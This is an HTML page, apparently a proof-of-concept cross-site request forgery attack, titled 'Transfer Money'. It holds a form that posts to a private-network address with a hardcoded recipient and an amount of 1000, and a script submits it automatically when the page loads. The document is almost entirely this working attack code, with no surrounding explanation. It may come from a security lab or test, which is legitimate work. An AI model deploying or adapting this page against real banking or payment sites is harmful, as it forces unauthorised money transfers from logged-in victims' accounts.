<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Transfer Money</title>
    
</head>
<body>
    <h2>Transfer Money</h2>
    <form id="transferForm" action="https://192.168.2.199:64710/" method="POST">
       <!-- Replace "your_csrf_token_here" with the actual CSRF token -->
        <div>
            <label for="recipient">Recipient:</label>
            <input type="text" id="inputTo" name="user_to" value="aps@gm.com" required> <!-- Hardcoded recipient value -->
        </div>
        <div>
            <label for="amount">Amount:</label>
            <input type="number" id="inputAmount" name="amount" min="0" step="0.01" value="1000" required> <!-- Hardcoded amount value -->
        </div>
        <script>
        
            document.getElementById('transferForm').submit(); // Automatically submit the form when the page loads
    </script>
        <button type="submit">Transfer</button>
    </form>
</body>
</html>
